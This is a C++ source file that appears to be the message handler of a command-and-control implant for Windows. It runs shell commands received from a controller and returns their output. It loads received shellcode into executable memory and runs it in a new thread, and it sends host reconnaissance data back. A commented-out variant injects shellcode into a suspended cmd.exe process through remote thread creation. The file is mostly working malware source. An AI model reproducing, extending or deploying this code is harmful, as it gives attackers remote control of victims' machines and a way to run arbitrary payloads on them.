/* MessageHandler.cpp */

#include "C2Profile.h"
#include "MessageHandler.h"
#include "MessageTypes.h"
#include "MessagePublisher.h"
#include "Recon.h"
#include "TransportLayer.h"

#include <iostream>
#include <sstream>

#include <cstdlib> // NOTE: needed to execute shell cmd





MessageHandler::MessageHandler()
	: transportLayer_(nullptr)
{
	// debug statement
}

MessageHandler::~MessageHandler()
{
	// debug statement
}

bool MessageHandler::executeCommand(RawByteBuffer& data)
{
	std::cout << "executeCommand: " << byte2string(data).c_str() << std::endl;


	// TODO: instead add result into the queue, and have transporter send them all when ready?
	// TODO: if the original (identified by the messageId) incoming internalMessage was marked as high priority, 
	//		 then skip the queue and send the message immediately 

	if (!transportLayer_)
	{
		std::cout << "ERROR: transportLayer_ is NULL!" << std::endl;
		return false;
	}


	std::string command = byte2string(data).c_str();
	std::string result;

	// EASIEST METHOD - just use _popen directly
	FILE* pipe = _popen(command.c_str(), "r");
	if (!pipe)
	{
		result = "ERROR: Failed to execute command";
	}
	else
	{
		char buffer[128];
		while (fgets(buffer, sizeof(buffer), pipe) != NULL)
		{
			result += buffer;
		}
		_pclose(pipe);
	}

	//queueResponse(COMMAND_RESULT, result, msg_id); // TODO: need to pass all of InternalMessage if i want ID
	std::cout << result << std::endl;

	// TODO: props should make a separate function for InternalMessage generation
	InternalMessage outMsg;
	outMsg.data = string2byte(result);

	MessageHeader header;
	header.messageType = MessageType::COMMAND_RESULT;
	header.messageId = 105; // TODO: 
	header.dataSize = outMsg.data.size();
	outMsg.header = header;

	bool sendResult = transportLayer_->sendMessage(outMsg);
	return sendResult;
}

bool MessageHandler::executeShellcode(InternalMessage& msg)
{
	std::cout << "executeShellcode" << std::endl;
	LPVOID shellMem = VirtualAlloc(0, msg.header.dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!shellMem) // TODO: checking if it is NULL would be more correct?
	{
		// DEBUG_PRINT("VirtualAlloc failed: %d\n", GetLastError());
		return false;
	}

	// memcpy(beacon_mem, shellcode, bytes_received);
	// TODO: copy 8 bytes at a time, and then copy left over
	for (unsigned int i = 0; i < msg.header.dataSize; ++i)
	{
		((char*)shellMem)[i] = msg.data[i];
	}

	// EXECUTE_READ.
	DWORD old_prot; // TODO: change to PDWORD lpflOldProtect?
	// NOTE: virtualProtect is also being called somewhere in the windows api
	if (VirtualProtect(shellMem, msg.header.dataSize, PAGE_EXECUTE_READ, &old_prot) == FALSE)
	{
		// Fail silently if we cannot make the memory executable.
		return false;
	}

	// DEBUG_PRINT("6 - Memory allocated and copied");

	// 4.
	//HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
	HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
	if (!thread)
	{
		// DEBUG_PRINT("CreateThread failed: %d\n", GetLastError());
		return false;
	}

	// DEBUG_PRINT("7 - Thread created, waiting..."); 
	WaitForSingleObject(thread, INFINITE); // Wait for thread to complete

	return true;
}


/* NOTE: creating seperate process entirely
bool MessageHandler::executeShellcode(InternalMessage& msg)
{
	std::cout << "executeShellcode in separate process" << std::endl;

	// Create a temporary process to host the shellcode
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;

	wchar_t cmdline[] = L"cmd.exe /c timeout 1 > nul";  // Dummy process

	if (CreateProcess(NULL, cmdline, NULL, NULL, FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
		// Allocate memory in the remote process
		LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, msg.header.dataSize,
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (remoteMem)
		{
			// Write shellcode to remote process
			WriteProcessMemory(pi.hProcess, remoteMem, msg.data.data(), msg.header.dataSize, NULL);

			// Create remote thread to execute shellcode
			HANDLE remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0,
				(LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
			if (remoteThread)
			{
				// Wait for shellcode to complete (with timeout)
				WaitForSingleObject(remoteThread, 10000);
				CloseHandle(remoteThread);
			}
		}

		// Clean up the temporary process
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		std::cout << "Shellcode executed in separate process" << std::endl;
		return true;
	}

	std::cout << "Failed to create separate process" << std::endl;
	return false;
}*/


bool MessageHandler::downloadFile(RawByteBuffer& data)
{
	std::cout << "downloadFile" << std::endl;
	return false;
}

bool MessageHandler::uploadFile(RawByteBuffer& data)
{
	std::cout << "uploadFile" << std::endl;
	return false;
}

bool MessageHandler::updateConfig(RawByteBuffer& data)
{
	std::cout << "updateConfig" << std::endl;
	return false;
}

bool MessageHandler::handleServerError(RawByteBuffer& data)
{
	std::cout << "handleServerError" << std::endl;
	return false;
}


bool MessageHandler::systemInfo(InternalMessage& msg)
{
	std::cout << "systemInfo" << std::endl; 
	ReconMessage rMsg{};
	//ZeroMemory(msg, sizeof(ReconMessage)); 

	// OS Version Info 
	//OSVERSIONINFOEX osInfo; 
	//osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX); 
	//if (GetVersionEx((OSVERSIONINFO*)&osInfo)) 
	//{ 
		//rMsg.dwMajorVersion = osInfo.dwMajorVersion;
		//rMsg.dwMinorVersion = osInfo.dwMinorVersion;
		//rMsg.dwBuildNumber = osInfo.dwBuildNumber;
		//rMsg.wProductType = osInfo.wProductType;
	//} 
	///
	typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
	HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
	if (hMod)
	{
		RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
		if (fxPtr != nullptr)
		{
			RTL_OSVERSIONINFOW rovi = { 0 };
			rovi.dwOSVersionInfoSize = sizeof(rovi);
			if (fxPtr(&rovi) == 0)
			{
				rMsg.dwMajorVersion = rovi.dwMajorVersion;
				rMsg.dwMinorVersion = rovi.dwMinorVersion;
				rMsg.dwBuildNumber = rovi.dwBuildNumber;
			}
		}
	}

	///


	// RAM Info 
	MEMORYSTATUSEX memoryStatus; 
	memoryStatus.dwLength = sizeof(memoryStatus); 
	if (GlobalMemoryStatusEx(&memoryStatus)) 
	{ 
		rMsg.totalPhysicalMemory = memoryStatus.ullTotalPhys; 
		rMsg.availablePhysicalMemory = memoryStatus.ullAvailPhys; 
	} 
	
	// Processor Info 
	SYSTEM_INFO systemInfo; 
	GetSystemInfo(&systemInfo); 
	rMsg.numberOfProcessors = systemInfo.dwNumberOfProcessors; 
	rMsg.processorArchitecture = systemInfo.wProcessorArchitecture;

	// Get processor name from registry (simplified) 
	//GetProcessorName(msg->processorName, sizeof(msg->processorName));

	// Local IP 
	//GetLocalIpAddress(msg->localIp, sizeof(msg->localIp)); 
	
	// System Names
	// DWORD size = sizeof(msg->computerName); 
	// GetComputerNameA(msg->computerName, &size); 
 
	//size = sizeof(msg->userName); 
	// GetUserNameA(msg->userName, &size); 

	// Domain name (simplified)
	// GetDomainName(msg->domainName, sizeof(msg->domainName)); 

	// Process name 
	// GetModuleFileNameA(NULL, msg->processName, sizeof(msg->processName)); 



	std::ostringstream result; 
	result << "dwMajorVersion: " << rMsg.dwMajorVersion << "\n";
	result << "dwMinorVersion: " << rMsg.dwMinorVersion << "\n"; 
	result << "dwBuildNumber: " << rMsg.dwBuildNumber << "\n"; 
	result << "wProductType: " << rMsg.wProductType << "\n"; 
	result << "totalPhysicalMemory: " << rMsg.totalPhysicalMemory << "\n"; 
	result << "availablePhysicalMemory: " << rMsg.availablePhysicalMemory << "\n"; 
	result << "numberOfProcessors: " << rMsg.numberOfProcessors << "\n"; 
	result << "processorArchitecture: " << rMsg.processorArchitecture << "\n";

	std::string outMsgData = result.str(); 

	InternalMessage outMsg; 
	outMsg.data = string2byte(outMsgData); 
	
	MessageHeader header; 
	header.messageType = MessageType::COMMAND_RESULT; 
	header.messageId = 105; // TODO: 
	header.dataSize = outMsg.data.size(); 
	outMsg.header = header; 
	bool sendResult = transportLayer_->sendMessage(outMsg); 
	return sendResult; 

}

// TODO: something about this function corruprts the memory
void MessageHandler::processMessage(InternalMessage& msg)
{
	systemInfo(msg);
	switch (msg.header.messageType)
	{
	case MessageType::EXECUTE_COMMAND:
		executeCommand(msg.data);
		break;
	
	case MessageType::EXECUTE_SHELL_CODE:
		executeShellcode(msg);
		//executeShellcode(msg.data);
		break;

	case MessageType::UPLOAD_FILE:
		uploadFile(msg.data);
		break;

	case MessageType::DOWNLOAD_FILE:
		downloadFile(msg.data);
		break;

	case MessageType::CONFIG_UPDATE:
		updateConfig(msg.data);
		break;

	case MessageType::ERROR_REPORT:
		// Server sent an error, handle it
		handleServerError(msg.data);
		break;
	default:
		std::cout << "default case, MessageType = " << msg.header.messageType << std::endl;
	}
}


void MessageHandler::sendQueuedMessages()
{
	std::cout << "sendQueuedMessages... not implemented" << std::endl;
}

void MessageHandler::setTransportLayer(TransportLayer& transportLayer)
{
	transportLayer_ = &transportLayer;
}

RawByteBuffer MessageHandler::string2byte(std::string& inMsg)
{
	return RawByteBuffer(inMsg.begin(), inMsg.end());
}

std::string MessageHandler::byte2string(RawByteBuffer& inMsg)
{
	return std::string(inMsg.begin(), inMsg.end());
}






